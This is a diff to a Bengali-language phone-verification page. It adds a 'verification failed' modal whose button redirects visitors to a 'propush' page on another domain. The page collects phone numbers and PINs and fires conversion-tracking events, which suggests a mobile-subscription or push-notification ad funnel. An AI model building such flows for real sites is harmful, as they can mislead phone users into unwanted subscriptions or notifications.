@@ -590,6 +590,14 @@
     </style>
 </head>
 <body>
+                    <div id="customModal5" class="modal-overlay">
+    <div class="modal-box">
+        <div class="modal-icon">❌</div>
+        <h2 class="modal-title">যাচাইকরণ ব্যর্থ হয়েছে</h2>
+        <p class="modal-desc">অনুগ্রহ করে ক্লিক করুন</p>
+        <button class="modal-btn" onclick="closeModal5()">ঠিক আছে</button>
+    </div>
+</div>
     
         <div id="customModal4" class="modal-overlay">
     <div class="modal-box">
@@ -604,7 +612,8 @@
         <div class="modal-icon">❌</div>
         <h2 class="modal-title">যাচাইকরণ কোড পাঠানো যায়নি।！</h2>
         <p class="modal-desc">অনুগ্রহ করে আপনার মোবাইল ফোন নম্বরটি পুনরায় লিখুন।</p>
-        <button class="modal-btn" onclick="closeModal3()">ঠিক আছে</button>
+        <button class="modal-btn" onclick="closeModal5()">ঠিক আছে</button>
+        <!-- 这里可能要加！ -->
     </div>
 </div>
 <div id="customModal2" class="modal-overlay">
@@ -1012,7 +1021,8 @@ container.style.gap = '8px';
         } else {
             // 请求失败，显示弹窗
            sendMaxConvEvent('pin_send_failed'); 
-            customModal3.classList.add('show');
+            customModal5.classList.add('show');
+            //这里
             document.getElementById('phoneSection').classList.add('hidden');
         }
     } catch (error) {
@@ -1083,7 +1093,8 @@ container.style.gap = '8px';
         } else {
             sendMaxConvEvent('pin_poll_failed')
             console.log('轮询失败');
-            document.getElementById('customModal2').classList.add('show');
+            //这里可能要加！
+            document.getElementById('customModal5').classList.add('show');
             return 0;
         }
     } catch(error) {
@@ -1174,7 +1185,8 @@ console.log('收集到的验证码:', pin); // 例如 "12345"
     // }
 }else{
     sendMaxConvEvent('pin_failed');
-    document.getElementById('customModal2').classList.add('show');
+    document.getElementById('customModal5').classList.add('show');
+    // 这里可能要加！
 }
 
             
@@ -1410,7 +1422,9 @@ function sendMaxConvEvent(eventName) {
     }
 } 
 
-
+function closeModal5(){
+    window.location.href = "https://contests.top/testAPI2/propush.html";
+};
 
 
    </script>
